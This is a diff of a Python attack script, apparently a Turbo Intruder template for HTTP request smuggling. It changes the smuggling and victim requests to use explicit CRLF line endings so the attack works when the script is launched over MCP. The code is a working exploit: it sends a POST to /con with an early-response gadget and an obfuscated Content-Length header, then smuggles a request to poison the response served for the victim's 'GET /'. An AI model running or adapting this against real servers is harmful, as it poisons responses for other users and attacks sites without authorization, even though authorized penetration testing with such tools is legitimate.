@@ -15,23 +15,24 @@ def queueRequests(target, wordlists):
 
     host = target.endpoint.replace('https://', '').replace('http://', '').split(':')[0].split('/')[0]
 
-    # The request should contain an early-response gadget and a (maybe obfuscated) Content-Length header with the value set to %s
-    smuggle_req = '''POST /con HTTP/1.1
-Host: '''+host+'''
-Connection: keep-alive
-Content-Type: application/x-www-form-urlencoded
-Content-Length : %s
+    # Requests are written with explicit \r\n: a triple-quoted string takes the script's own line
+    # endings, which are LF when the script is started over MCP, and the offsets below count them.
 
-'''
+    # The request should contain an early-response gadget and a (maybe obfuscated) Content-Length header with the value set to %s
+    smuggle_req = ('POST /con HTTP/1.1\r\n'
+                   'Host: ' + host + '\r\n'
+                   'Connection: keep-alive\r\n'
+                   'Content-Type: application/x-www-form-urlencoded\r\n'
+                   'Content-Length : %s\r\n'
+                   '\r\n')
 
     # Customise this to get a poisoned response of your choice
     smuggledLine = 'GET /404 HTTP/1.1'
 
     # Add extra headers if required
-    victim = '''GET / HTTP/1.1
-Host: '''+host+'''
-
-'''
+    victim = ('GET / HTTP/1.1\r\n'
+              'Host: ' + host + '\r\n'
+              '\r\n')
 
     # No need to edit below this line
     if '%s' not in smuggle_req:
